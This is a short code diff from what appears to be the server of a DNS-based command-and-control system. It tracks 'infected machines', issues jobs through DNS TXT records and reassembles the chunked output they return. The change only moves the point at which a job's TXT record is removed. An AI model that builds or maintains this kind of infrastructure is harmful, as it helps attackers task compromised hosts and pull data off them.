@@ -31,8 +31,6 @@ class ExecService:
         machine.job_ask_count += 1
         machine.save()
 
-        DnsService().remove_job_txt(machine).apply()
-
     def process_job_return_fragment(self, machine_id: str, data: str, chunk_id: str):
         machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()
         if machine is None:
@@ -44,6 +42,7 @@ class ExecService:
 
         if job.started_at is None:
             job.started_at = timezone.now()
+            DnsService().remove_job_txt(machine).apply()
 
         job.chunks_received_count += 1
         job.save()
